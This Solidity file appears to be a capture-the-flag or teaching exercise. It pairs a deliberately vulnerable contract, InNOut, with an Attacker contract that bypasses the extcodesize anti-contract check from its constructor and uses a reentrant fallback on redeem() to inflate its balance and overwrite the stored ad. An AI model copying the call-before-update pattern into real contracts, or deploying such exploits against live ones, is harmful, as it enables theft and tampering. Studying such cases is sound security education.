// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract InNOut {
    string data = "Welcome to my smart contract! please don't vandalize it >:(";
    int256 THRESHOLD = 100;

    mapping(address => int256) public accounts ;
    mapping(address => int256) public freebies ;
    mapping(address => bool) public registered ;
    

    constructor () {
    }

    modifier moneyBags(address _addr) {
        require (accounts[_addr]>THRESHOLD);
        _;
    }

    modifier isNotContract(address _a) {
        uint size;
        assembly {
            size := extcodesize(_a)
        }
        require(size == 0);
        _;
    }

    function checkAccountStatus(address _addr) public view returns(int256,int256) {
        return (freebies[_addr],accounts[_addr]);
    }

    function redeem(int256 tickets) public payable {
        // You can have a little money, as a treat. No funny business!
        require(registered[msg.sender]);
        require(freebies[msg.sender] >= tickets);
        require(tickets >=0);
        // Show me your wallet though.
        (bool status, ) = payable(msg.sender).call{value:msg.value}("returnWallet");
        require(status, "Couldn't send the money back, reverting...");
        freebies[msg.sender] -= tickets;
        accounts[msg.sender] += tickets;
    }

    function createAccount() public isNotContract(msg.sender) {
        registered[msg.sender] = true;
        freebies[msg.sender] = 10;
        accounts[msg.sender] = 0;        
    }

    function buyAdSpace(string memory newAd) public moneyBags(msg.sender) {
        // If you're rich enough we won't even ask you for money.
        data = newAd;
    }

    function showAd() public view returns (string memory) {
        return data;
    }
}

contract Attacker {
    InNOut public victim;
    uint8 iter = 0;
    uint8 threshold = 10;

    constructor (address _addr) payable{
        victim = InNOut(_addr);
        victim.createAccount();
    }

    fallback() external payable {
        iter += 1;
        if (iter < threshold) {
            victim.redeem{value:msg.value}(9);
        }
        
    }

    function startReentrancy(uint8 times) public payable{
        iter = 0;
        threshold = times;
        victim.redeem{value:msg.value}(9);
    }

    function currentStatus() public view returns (int256,int256) {
        return victim.checkAccountStatus(address(this));
    }

    function buySlot(string memory input) public {
        victim.buyAdSpace(input);
    }
}